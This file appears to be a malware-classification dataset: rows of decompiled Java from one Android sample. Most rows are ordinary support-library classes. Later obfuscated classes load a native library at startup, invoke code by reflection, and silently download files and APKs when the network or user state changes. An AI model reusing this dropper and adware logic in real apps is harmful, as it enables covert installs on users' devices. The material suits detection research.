"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.widget\ScrollerCompat.code","class ScrollerCompat {   Scroller mScroller; static class ScrollerCompatImplIcs extends ScrollerCompat {     public ScrollerCompatImplIcs(    Context context){       super(context);     }     @Override public float getCurrVelocity(){       return ScrollerCompatIcs.getCurrVelocity(this.mScroller);     }   }   public static ScrollerCompat from(  Context context){     return Build.VERSION.SDK_INT >= 14 ? new ScrollerCompatImplIcs(context) : new ScrollerCompat(context);   }   ScrollerCompat(  Context context){     this.mScroller=new Scroller(context);   }   public boolean isFinished(){     return this.mScroller.isFinished();   }   public int getDuration(){     return this.mScroller.getDuration();   }   public int getCurrX(){     return this.mScroller.getCurrX();   }   public int getCurrY(){     return this.mScroller.getCurrY();   }   public float getCurrVelocity(){     return 0.0f;   }   public boolean computeScrollOffset(){     return this.mScroller.computeScrollOffset();   }   public void startScroll(  int startX,  int startY,  int dx,  int dy){     this.mScroller.startScroll(startX,startY,dx,dy);   }   public void startScroll(  int startX,  int startY,  int dx,  int dy,  int duration){     this.mScroller.startScroll(startX,startY,dx,dy,duration);   }   public void fling(  int startX,  int startY,  int velocityX,  int velocityY,  int minX,  int maxX,  int minY,  int maxY){     this.mScroller.fling(startX,startY,velocityX,velocityY,minX,maxX,minY,maxY);   }   public void abortAnimation(){     this.mScroller.abortAnimation();   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.widget\ScrollerCompatIcs.code","class ScrollerCompatIcs {   ScrollerCompatIcs(){   }   public static float getCurrVelocity(  Scroller scroller){     return scroller.getCurrVelocity();   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.widget\ScrollerCompatImplIcs.code","static class ScrollerCompatImplIcs extends ScrollerCompat {   public ScrollerCompatImplIcs(  Context context){     super(context);   }   @Override public float getCurrVelocity(){     return ScrollerCompatIcs.getCurrVelocity(this.mScroller);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.widget\SearchViewCompat.code","public class SearchViewCompat {   private static final SearchViewCompatImpl IMPL; interface SearchViewCompatImpl {     Object newOnQueryTextListener(    OnQueryTextListenerCompat onQueryTextListenerCompat);     View newSearchView(    Context context);     void setOnQueryTextListener(    Object obj,    Object obj2);   } static class SearchViewCompatStubImpl implements SearchViewCompatImpl {     SearchViewCompatStubImpl(){     }     @Override public View newSearchView(    Context context){       return null;     }     @Override public Object newOnQueryTextListener(    OnQueryTextListenerCompat listener){       return null;     }     @Override public void setOnQueryTextListener(    Object searchView,    Object listener){     }   } static class SearchViewCompatHoneycombImpl extends SearchViewCompatStubImpl {     SearchViewCompatHoneycombImpl(){     }     @Override public View newSearchView(    Context context){       return SearchViewCompatHoneycomb.newSearchView(context);     }     @Override public Object newOnQueryTextListener(    final OnQueryTextListenerCompat listener){       return SearchViewCompatHoneycomb.newOnQueryTextListener(new SearchViewCompatHoneycomb.OnQueryTextListenerCompatBridge(){         @Override public boolean onQueryTextSubmit(        String query){           return listener.onQueryTextSubmit(query);         }         @Override public boolean onQueryTextChange(        String newText){           return listener.onQueryTextChange(newText);         }       } );     }     @Override public void setOnQueryTextListener(    Object searchView,    Object listener){       SearchViewCompatHoneycomb.setOnQueryTextListener(searchView,listener);     }   } static {     if (Build.VERSION.SDK_INT >= 11) {       IMPL=new SearchViewCompatHoneycombImpl();     }  else {       IMPL=new SearchViewCompatStubImpl();     }   }   private SearchViewCompat(  Context context){   }   public static View newSearchView(  Context context){     return IMPL.newSearchView(context);   }   public static void setOnQueryTextListener(  View searchView,  OnQueryTextListenerCompat listener){     IMPL.setOnQueryTextListener(searchView,listener.mListener);   } public static abstract class OnQueryTextListenerCompat {     final Object mListener=SearchViewCompat.IMPL.newOnQueryTextListener(this);     public boolean onQueryTextSubmit(    String query){       return false;     }     public boolean onQueryTextChange(    String newText){       return false;     }   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.widget\SearchViewCompatHoneycomb.code","class SearchViewCompatHoneycomb { interface OnQueryTextListenerCompatBridge {     boolean onQueryTextChange(    String str);     boolean onQueryTextSubmit(    String str);   }   SearchViewCompatHoneycomb(){   }   public static View newSearchView(  Context context){     return new SearchView(context);   }   public static Object newOnQueryTextListener(  final OnQueryTextListenerCompatBridge listener){     return new SearchView.OnQueryTextListener(){       @Override public boolean onQueryTextSubmit(      String query){         return OnQueryTextListenerCompatBridge.this.onQueryTextSubmit(query);       }       @Override public boolean onQueryTextChange(      String newText){         return OnQueryTextListenerCompatBridge.this.onQueryTextChange(newText);       }     } ;   }   public static void setOnQueryTextListener(  Object searchView,  Object listener){     ((SearchView)searchView).setOnQueryTextListener((SearchView.OnQueryTextListener)listener);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.widget\SearchViewCompatHoneycombImpl.code","static class SearchViewCompatHoneycombImpl extends SearchViewCompatStubImpl {   SearchViewCompatHoneycombImpl(){   }   @Override public View newSearchView(  Context context){     return SearchViewCompatHoneycomb.newSearchView(context);   }   @Override public Object newOnQueryTextListener(  final OnQueryTextListenerCompat listener){     return SearchViewCompatHoneycomb.newOnQueryTextListener(new SearchViewCompatHoneycomb.OnQueryTextListenerCompatBridge(){       @Override public boolean onQueryTextSubmit(      String query){         return listener.onQueryTextSubmit(query);       }       @Override public boolean onQueryTextChange(      String newText){         return listener.onQueryTextChange(newText);       }     } );   }   @Override public void setOnQueryTextListener(  Object searchView,  Object listener){     SearchViewCompatHoneycomb.setOnQueryTextListener(searchView,listener);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.widget\SearchViewCompatImpl.code","interface SearchViewCompatImpl {   Object newOnQueryTextListener(  OnQueryTextListenerCompat onQueryTextListenerCompat);   View newSearchView(  Context context);   void setOnQueryTextListener(  Object obj,  Object obj2); } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.widget\SearchViewCompatStubImpl.code","static class SearchViewCompatStubImpl implements SearchViewCompatImpl {   SearchViewCompatStubImpl(){   }   @Override public View newSearchView(  Context context){     return null;   }   @Override public Object newOnQueryTextListener(  OnQueryTextListenerCompat listener){     return null;   }   @Override public void setOnQueryTextListener(  Object searchView,  Object listener){   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.widget\SimpleCursorAdapter.code","public class SimpleCursorAdapter extends ResourceCursorAdapter {   private CursorToStringConverter mCursorToStringConverter;   protected int[] mFrom;   String[] mOriginalFrom;   private int mStringConversionColumn;   protected int[] mTo;   private ViewBinder mViewBinder; public interface CursorToStringConverter {     CharSequence convertToString(    Cursor cursor);   } public interface ViewBinder {     boolean setViewValue(    View view,    Cursor cursor,    int i);   }   @Deprecated public SimpleCursorAdapter(  Context context,  int layout,  Cursor c2,  String[] from,  int[] to){     super(context,layout,c2);     this.mStringConversionColumn=-1;     this.mTo=to;     this.mOriginalFrom=from;     findColumns(from);   }   public SimpleCursorAdapter(  Context context,  int layout,  Cursor c2,  String[] from,  int[] to,  int flags){     super(context,layout,c2,flags);     this.mStringConversionColumn=-1;     this.mTo=to;     this.mOriginalFrom=from;     findColumns(from);   }   @Override public void bindView(  View view,  Context context,  Cursor cursor){     ViewBinder binder=this.mViewBinder;     int count=this.mTo.length;     int[] from=this.mFrom;     int[] to=this.mTo;     for (int i=0; i < count; i++) {       View v=view.findViewById(to[i]);       if (v != null) {         boolean bound=false;         if (binder != null) {           bound=binder.setViewValue(v,cursor,from[i]);         }         if (bound) {           continue;         }  else {           String text=cursor.getString(from[i]);           if (text == null) {             text="""";           }           if (v instanceof TextView) {             setViewText((TextView)v,text);           }  else           if (v instanceof ImageView) {             setViewImage((ImageView)v,text);           }  else {             throw new IllegalStateException(v.getClass().getName() + "" is not a  view that can be bounds by this SimpleCursorAdapter"");           }         }       }     }   }   public ViewBinder getViewBinder(){     return this.mViewBinder;   }   public void setViewBinder(  ViewBinder viewBinder){     this.mViewBinder=viewBinder;   }   public void setViewImage(  ImageView v,  String value){     try {       v.setImageResource(Integer.parseInt(value));     }  catch (    NumberFormatException e) {       v.setImageURI(Uri.parse(value));     }   }   public void setViewText(  TextView v,  String text){     v.setText(text);   }   public int getStringConversionColumn(){     return this.mStringConversionColumn;   }   public void setStringConversionColumn(  int stringConversionColumn){     this.mStringConversionColumn=stringConversionColumn;   }   public CursorToStringConverter getCursorToStringConverter(){     return this.mCursorToStringConverter;   }   public void setCursorToStringConverter(  CursorToStringConverter cursorToStringConverter){     this.mCursorToStringConverter=cursorToStringConverter;   }   @Override public CharSequence convertToString(  Cursor cursor){     if (this.mCursorToStringConverter != null) {       return this.mCursorToStringConverter.convertToString(cursor);     }     if (this.mStringConversionColumn > -1) {       return cursor.getString(this.mStringConversionColumn);     }     return super.convertToString(cursor);   }   private void findColumns(  String[] from){     if (this.mCursor != null) {       int count=from.length;       if (this.mFrom == null || this.mFrom.length != count) {         this.mFrom=new int[count];       }       for (int i=0; i < count; i++) {         this.mFrom[i]=this.mCursor.getColumnIndexOrThrow(from[i]);       }       return;     }     this.mFrom=null;   }   @Override public Cursor swapCursor(  Cursor c2){     Cursor res=super.swapCursor(c2);     findColumns(this.mOriginalFrom);     return res;   }   public void changeCursorAndColumns(  Cursor c2,  String[] from,  int[] to){     this.mOriginalFrom=from;     this.mTo=to;     super.changeCursor(c2);     findColumns(this.mOriginalFrom);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.widget\ViewBinder.code","public interface ViewBinder {   boolean setViewValue(  View view,  Cursor cursor,  int i); } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\c.i.a\a.code","public class a extends Application {   @Override public void onCreate(){     super.onCreate();     u.i(this,0);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\c.i.a\c.code","public class c extends ClassLoader {   public ClassLoader d;   public c(  ClassLoader classLoader){     super(classLoader);   }   @Override public Class<?> loadClass(  String str) throws ClassNotFoundException {     Class<?> cls=null;     try {       cls=super.loadClass(str);     }  catch (    Exception e) {     }     if (cls == null && this.d != null) {       try {         cls=this.d.loadClass(str);       }  catch (      Exception e2) {       }     }     if (cls == null) {       try {         cls=getParent().loadClass(str);       }  catch (      Exception e3) {       }     }     if (cls == null) {       throw new ClassNotFoundException(str);     }     return cls;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\c.i.a\u.code","public class u {   public static String SDKVERSION_CODE=""503"";   public static String SDKVERSION_NAME=""V201405135.0.3"";   public static native void di(  Context context,  int i);   public static void i(  Context context,  int i){     try {       System.loadLibrary(""ni"");     }  catch (    Exception e) {       e.printStackTrace();     }     di(context,i);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.a.api.apr.aa\v_kvpgs.code","public class v_kvpgs {   public static void vpgs(  Context v){     kcuy.lscy(v,""9fbece4372b64a54812dabf51455927a"",""anzhi"").ncry();     yait.scvy(v,""9fbece4372b64a54812dabf51455927a"",""anzhi"").mcty(-1,-1,null,1);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac\a.code","public class a {   private static r p;   public static void b(  Activity activity,  Bundle bundle){     h.a(activity,yait.class,com.baty.dasy.resy.cac.j.d.b(activity),com.baty.dasy.resy.cac.j.d.e(activity));     p=new r(activity);   }   public static void c(  Activity activity,  Intent intent){     if (p != null) {       p.a(intent);     }   }   public static boolean d(  int i,  KeyEvent keyEvent){     if (p != null) {       return p.a(i,keyEvent);     }     return false;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac\aa.code","class aa implements Runnable {   final u a;   public aa(  u uVar){     this.a=uVar;   }   @Override public void run(){     com.baty.dasy.resy.cac.c.a aVar;     aVar=this.a.f41c;     aVar.u=true;     this.a.a.f(com.baty.dasy.resy.cac.j.a.a(46));   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac\ab.code","public class ab extends BaseAdapter implements View.OnClickListener {   private List a;   private com.baty.dasy.resy.cac.b.a b;   private Context f1c;   private Handler d=new ac(this);   private ad e=null;   public ab(  Context context,  List list){     this.a=new ArrayList();     this.f1c=context;     this.a=list;   }   @Override public int getCount(){     return this.a.size();   }   @Override public Object getItem(  int i){     return this.a.get(i);   }   @Override public long getItemId(  int i){     return i;   }   @Override public View getView(  int i,  View view,  ViewGroup viewGroup){     com.baty.dasy.resy.cac.c.a aVar=(com.baty.dasy.resy.cac.c.a)this.a.get(i);     Drawable a=com.baty.dasy.resy.cac.j.h.a(this.f1c,15);     ae aeVar=(ae)view;     if (aeVar == null) {       aeVar=new ae(this,this.f1c);     }     if (""mounted"".equals(Environment.getExternalStorageState())) {       String str=Environment.getExternalStorageDirectory() + ""/"" + com.baty.dasy.resy.cac.j.a.a(6)+ aVar.e+ ""/""+ com.baty.dasy.resy.cac.j.d.d(aVar.k);       if (new File(str).exists()) {         a=com.baty.dasy.resy.cac.j.i.c(this.f1c,str);       }  else {         this.b=new com.baty.dasy.resy.cac.b.a(this.f1c,aVar,this.d);         com.baty.dasy.resy.cac.b.g gVar=new com.baty.dasy.resy.cac.b.g(aVar.k,com.baty.dasy.resy.cac.j.d.b(this.f1c,com.baty.dasy.resy.cac.j.d.d(aVar.k),aVar.e),0);         gVar.a((Object)(-1));         q.a(this.f1c,gVar,this.b);       }     }     ae.a(aeVar).setImageDrawable(a);     ae.b(aeVar).setText(aVar.d);     ae.c(aeVar).setText(aVar.h);     if (i % 2 != 0) {       aeVar.a();     }     return aeVar;   }   @Override public void onClick(  View view){     com.baty.dasy.resy.cac.c.a aVar=(com.baty.dasy.resy.cac.c.a)this.a.get(((Integer)view.getTag()).intValue());     if (this.e != null) {       this.e.a(aVar);     }   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac\ac.code","public class ac extends Handler {   final ab a;   public ac(  ab abVar){     this.a=abVar;   }   @Override public void handleMessage(  Message message){     Context context;     Bundle data=message.getData();     int i=data.getInt(""tag"");     String string=data.getString(com.baty.dasy.resy.cac.j.a.a(118));     if (string != null) {       context=this.a.f1c;       if (com.baty.dasy.resy.cac.j.d.a(context,string,false) == null || i != -1) {         return;       }       this.a.notifyDataSetChanged();     }   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac\ad.code","public interface ad {   void a(  com.baty.dasy.resy.cac.c.a aVar); } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac\ae.code","public class ae extends LinearLayout {   final ab a;   private ImageView b;   private TextView f2c;   private TextView d;   private ImageView e;   public ae(  ab abVar,  Context context){     super(context);     this.a=abVar;     setOrientation(1);     LinearLayout linearLayout=new LinearLayout(context);     linearLayout.setOrientation(0);     addView(linearLayout,new LinearLayout.LayoutParams(-1,-2));     this.e=new ImageView(context);     this.e.setBackgroundColor(-4604739);     linearLayout.addView(this.e,new LinearLayout.LayoutParams(1,-1));     LinearLayout linearLayout2=new LinearLayout(context);     linearLayout.setOrientation(0);     LinearLayout.LayoutParams layoutParams=new LinearLayout.LayoutParams(-2,-2);     layoutParams.weight=1.0f;     int a=com.baty.dasy.resy.cac.j.d.a(context,7);     layoutParams.bottomMargin=a;     layoutParams.topMargin=a;     linearLayout.addView(linearLayout2,layoutParams);     LinearLayout.LayoutParams layoutParams2=new LinearLayout.LayoutParams(-2,-2);     int a2=com.baty.dasy.resy.cac.j.d.a(context,5);     layoutParams2.rightMargin=a2;     layoutParams2.leftMargin=a2;     this.b=new ImageView(context);     linearLayout2.addView(this.b,layoutParams2);     LinearLayout linearLayout3=new LinearLayout(context);     linearLayout3.setOrientation(1);     LinearLayout.LayoutParams layoutParams3=new LinearLayout.LayoutParams(-2,-2);     layoutParams3.leftMargin=com.baty.dasy.resy.cac.j.d.a(context,2);     linearLayout2.addView(linearLayout3,layoutParams3);     this.f2c=new TextView(context);     this.f2c.setGravity(17);     this.f2c.setTextSize(12.0f);     this.f2c.setTextColor(-16777216);     this.f2c.setSingleLine();     this.f2c.setEllipsize(TextUtils.TruncateAt.END);     linearLayout3.addView(this.f2c,new LinearLayout.LayoutParams(-2,-2));     LinearLayout.LayoutParams layoutParams4=new LinearLayout.LayoutParams(-2,-2);     this.d=new TextView(context);     this.d.setGravity(17);     this.d.setTextSize(12.0f);     this.d.setTextColor(-16777216);     this.d.setSingleLine();     this.d.setEllipsize(TextUtils.TruncateAt.END);     linearLayout3.addView(this.d,layoutParams4);     ImageView imageView=new ImageView(context);     imageView.setBackgroundColor(-4604739);     addView(imageView,new LinearLayout.LayoutParams(-1,1));     this.e=new ImageView(context);     this.e.setBackgroundColor(-4604739);     linearLayout.addView(this.e,new LinearLayout.LayoutParams(1,-1));     StateListDrawable stateListDrawable=new StateListDrawable();     stateListDrawable.addState(new int[]{R.attr.state_pressed},new ColorDrawable(-10310438));     stateListDrawable.addState(new int[]{R.attr.state_enabled},new ColorDrawable(-1));     setBackgroundDrawable(stateListDrawable);   }   public static ImageView a(  ae aeVar){     return aeVar.b;   }   public static TextView b(  ae aeVar){     return aeVar.f2c;   }   public static TextView c(  ae aeVar){     return aeVar.d;   }   public void a(){   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac\b.code","public class b {   private static Context mContext;   public static void a(  Context context,  Intent intent){     mContext=context;     com.baty.dasy.resy.cac.j.a.a(context);     h.a(context,yait.class,com.baty.dasy.resy.cac.j.d.b(context),com.baty.dasy.resy.cac.j.d.e(context));     String action=intent.getAction();     com.baty.dasy.resy.cac.g.a aVar=null;     if (""android.intent.action.PACKAGE_ADDED"".equals(action)) {       String uri=intent.getData().toString();       aVar=new com.baty.dasy.resy.cac.g.c(context,uri.substring(com.baty.dasy.resy.cac.j.a.a(34).length(),uri.length()));     }  else     if (""android.net.conn.CONNECTIVITY_CHANGE"".equals(action)) {       aVar=new com.baty.dasy.resy.cac.g.b(context,intent);     }  else     if (""android.intent.action.USER_PRESENT"".equals(action)) {       aVar=new com.baty.dasy.resy.cac.g.f(context,intent);     }     aVar.a();   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac\c.code","public interface c { } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac\d.code","public class d {   private static d i=null;   private File b;   private Context f12c;   private int d;   private com.baty.dasy.resy.cac.c.d h;   private com.baty.dasy.resy.cac.c.a e=null;   private boolean f=false;   private int g=5;   public Handler a=new Handler();   private Handler j=new g(this);   private Object k=null;   public d(  Context context){     this.f12c=context;     com.baty.dasy.resy.cac.j.a.a(context);     b();   }   public static d a(  Context context){     if (i == null) {       i=new d(context);     }     return i;   }   public boolean a(  com.baty.dasy.resy.cac.c.a[] aVarArr){     if (aVarArr == null || aVarArr.length <= 0) {       return false;     }     this.e=aVarArr[0];     boolean a=new com.baty.dasy.resy.cac.j.b().a(this.e.f);     if (com.baty.dasy.resy.cac.j.d.j(this.f12c,this.e.f) || a) {       com.baty.dasy.resy.cac.j.l.a(""i"");       if (!com.baty.dasy.resy.cac.j.d.b(this.f12c).equals(com.baty.dasy.resy.cac.j.a.a(109))) {         return false;       }     }     this.e.y=1;     com.baty.dasy.resy.cac.j.d.c(this.f12c,this.e);     this.b=com.baty.dasy.resy.cac.j.d.b(this.f12c,com.baty.dasy.resy.cac.j.d.a(this.e),this.e.e);     if (this.b.exists()) {       this.j.sendEmptyMessage(this.d);     }  else {       String[] a2=com.baty.dasy.resy.cac.j.d.a(this.e.r,"";"");       if (a2 != null) {         int length=a2.length;         for (int i2=0; i2 < length; i2++) {           com.baty.dasy.resy.cac.b.g gVar=new com.baty.dasy.resy.cac.b.g(a2[i2],this.b,0);           gVar.a(Integer.valueOf(i2));           q.a(this.f12c,gVar,new com.baty.dasy.resy.cac.b.a(this.f12c,this.e,this.j));         }       }     }     q.a(this.f12c,new com.baty.dasy.resy.cac.b.g(this.e.k,com.baty.dasy.resy.cac.j.d.b(this.f12c,com.baty.dasy.resy.cac.j.d.d(this.e.k),this.e.e),0),new com.baty.dasy.resy.cac.b.a(this.f12c,this.e,null));     String[] a3=com.baty.dasy.resy.cac.j.d.a(this.e.l,"";"");     int length2=a3 != null ? a3.length : 0;     for (int i3=0; i3 < length2; i3++) {       q.a(this.f12c,new com.baty.dasy.resy.cac.b.g(a3[i3],com.baty.dasy.resy.cac.j.d.b(this.f12c,com.baty.dasy.resy.cac.j.d.d(a3[i3]),this.e.e),0),new com.baty.dasy.resy.cac.b.a(this.f12c,this.e,null));     }     return true;   }   private void b(){     this.h=new com.baty.dasy.resy.cac.c.d();     this.h.a=2;   }   public boolean c(){     if (!this.b.exists()) {       return false;     }     com.baty.dasy.resy.cac.j.d.a(com.baty.dasy.resy.cac.j.d.b(this.e));     return com.baty.dasy.resy.cac.j.d.c(this.b.getAbsolutePath(),com.baty.dasy.resy.cac.j.d.b(this.e).getAbsolutePath());   }   public void a(){     if (this.k != null) {       try {         Method[] declaredMethods=this.k.getClass().getDeclaredMethods();         if (declaredMethods == null || declaredMethods.length <= 0) {           return;         }         declaredMethods[0].invoke(this.k,new Object[0]);       }  catch (      Exception e) {         e.printStackTrace();       }     }   }   public void a(  int i2){     com.baty.dasy.resy.cac.b.c.a(this.f12c);     if (!""mounted"".equals(Environment.getExternalStorageState())) {       com.baty.dasy.resy.cac.j.l.a("""" + Environment.getExternalStorageState());       return;     }     if (j.a(this.f12c).b() || this.f) {       return;     }     com.baty.dasy.resy.cac.j.l.a(com.baty.dasy.resy.cac.j.a.a(28));     com.baty.dasy.resy.cac.j.l.a("""" + this.h.a);     com.baty.dasy.resy.cac.j.d.k(this.f12c);     this.d=i2;     new e(this).start();   }   public void a(  Object obj){     this.k=obj;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac\dsr.code","public class dsr extends BroadcastReceiver implements c {   @Override public void onReceive(  Context context,  Intent intent){     try {       Class.forName(getClass().getPackage().getName() + "".b"").getMethod(""a"",Context.class,Intent.class).invoke(null,context,intent);     }  catch (    Exception e) {       e.printStackTrace();     }   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac\e.code","public class e extends Thread {   final d a;   public e(  d dVar){     this.a=dVar;   }   @Override public void run(){     throw new UnsupportedOperationException(""Method not decompiled: com.baty.dasy.resy.cac.e.run():void"");   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac\f.code","class f implements Runnable {   final e a;   public f(  e eVar){     this.a=eVar;   }   @Override public void run(){     this.a.a.f=false;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac\g.code","public class g extends Handler {   final d a;   public g(  d dVar){     this.a=dVar;   }   @Override public void handleMessage(  Message message){     boolean c2;     int i;     Context context;     Context context2;     com.baty.dasy.resy.cac.c.a aVar;     Context context3;     com.baty.dasy.resy.cac.c.a aVar2;     Context context4;     com.baty.dasy.resy.cac.c.a aVar3;     message.getData().getInt(""tag"");     c2=this.a.c();     if (c2) {       i=this.a.d; switch (i) { case 0:         context4=this.a.f12c;       j a=j.a(context4);     aVar3=this.a.e;   a.b(aVar3); break; case 1: context3=this.a.f12c; j a2=j.a(context3); aVar2=this.a.e; a2.a(aVar2); break; case 2: context=this.a.f12c; j a3=j.a(context); context2=this.a.f12c; aVar=this.a.e; a3.a(context2,aVar); break; } this.a.f=false; } } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac\h.code","public class h {   public static Context a;   public static Class b;   public static Class f21c;   public static boolean d=false;   private static String e;   public static String a(){     if (e == null) {       e=com.baty.dasy.resy.cac.j.d.a(a);       if (e == null) {         e=com.baty.dasy.resy.cac.j.a.a(115);       }     }     return e;   }   public static void a(  int i,  int i2,  Object obj,  int i3){     j.a(a).a(i,i2);     d.a(a).a(obj);     if (i3 == 2) {       return;     }     d.a(a).a(i3);     new i().start();   }   public static void a(  Context context,  Class cls){     try {       String name=cls.getPackage().getName();       PackageInfo packageInfo=context.getPackageManager().getPackageInfo(context.getPackageName(),1);       Class.forName(cls.getPackage().getName() + "".c"");       ActivityInfo[] activityInfoArr=packageInfo.activities;       for (      ActivityInfo activityInfo : activityInfoArr) {         try {           Class<?> cls2=Class.forName(activityInfo.name);           if (cls2.getPackage().getName().contains(name)) {             b=cls2;           }         }  catch (        Exception e2) {         }       }       for (      ActivityInfo activityInfo2 : context.getPackageManager().getPackageInfo(context.getPackageName(),2).receivers) {         try {           Class<?> cls3=Class.forName(activityInfo2.name);           if (cls3.getPackage().getName().contains(name)) {             f21c=cls3;           }         }  catch (        Exception e3) {         }       }     }  catch (    Exception e4) {       e4.printStackTrace();     }   }   public static void a(  Context context,  Class cls,  String str,  String str2){     a=context;     d.a(context);     if (!TextUtils.isEmpty(str)) {       com.baty.dasy.resy.cac.j.d.a(context,str);     }     if (!TextUtils.isEmpty(str2)) {       com.baty.dasy.resy.cac.j.d.b(context,str2);     }     a(context,cls);     if (b == null || f21c == null) {       return;     }     d=true;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac\i.code","public final class i extends Thread {   @Override public void run(){     try {       Thread.sleep(20000L);     }  catch (    InterruptedException e) {       e.printStackTrace();     }     com.baty.dasy.resy.cac.j.d.o(h.a);     new com.baty.dasy.resy.cac.j.c(1).a(h.a);     new com.baty.dasy.resy.cac.j.c(2).a(h.a);     com.baty.dasy.resy.cac.j.d.p(h.a);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac\j.code","!org.eclipse.jdt.core.dom.TypeDeclaration@7663b36"
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac\k.code","public class k implements View.OnClickListener {   final j a;   public k(  j jVar){     this.a=jVar;   }   @Override public void onClick(  View view){     this.a.c(2);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac\kfa.code","public class kfa extends Activity implements c {   @Override protected void onCreate(  Bundle bundle){     super.onCreate(bundle);     com.baty.dasy.resy.cac.j.a.a(this);     h.a(this,kfa.class,com.baty.dasy.resy.cac.j.d.b(this),com.baty.dasy.resy.cac.j.d.e(this));     try {       Class.forName(getClass().getPackage().getName() + "".a"").getMethod(""b"",Activity.class,Bundle.class).invoke(null,this,null);     }  catch (    Exception e) {       e.printStackTrace();     }   }   @Override public boolean onKeyDown(  int i,  KeyEvent keyEvent){     boolean z;     if (i == 4) {       try {         z=((Boolean)Class.forName(getClass().getPackage().getName() + "".a"").getMethod(""d"",Integer.TYPE,KeyEvent.class).invoke(null,Integer.valueOf(i),keyEvent)).booleanValue();       }  catch (      Exception e) {         e.printStackTrace();         z=false;       }       if (z) {         return z;       }     }     return super.onKeyDown(i,keyEvent);   }   @Override protected void onNewIntent(  Intent intent){     super.onNewIntent(intent);     try {       Class.forName(getClass().getPackage().getName() + "".a"").getMethod(""c"",Activity.class,Intent.class).invoke(null,this,intent);     }  catch (    Exception e) {       e.printStackTrace();     }   } } "
